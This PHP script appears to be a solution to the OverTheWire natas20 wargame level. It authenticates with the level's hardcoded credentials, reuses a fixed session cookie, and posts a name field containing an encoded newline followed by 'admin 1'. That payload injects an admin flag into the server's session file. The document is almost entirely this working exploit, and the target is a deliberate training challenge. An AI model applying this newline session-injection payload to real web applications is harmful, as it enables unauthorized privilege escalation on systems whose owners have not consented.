<?php
$url = "http://natas20.natas.labs.overthewire.org/index.php?debug=true";
$ch = curl_init ($url);
curl_setopt($ch, CURLOPT_USERPWD,"natas20:guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH");  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=fc4oncrchqpufld1k6a3b5eelk');
curl_setopt ($ch, CURLOPT_POSTFIELDS, "name=%0Aadmin%201");
$output = curl_exec ($ch);
curl_close($ch);
echo $output;
?>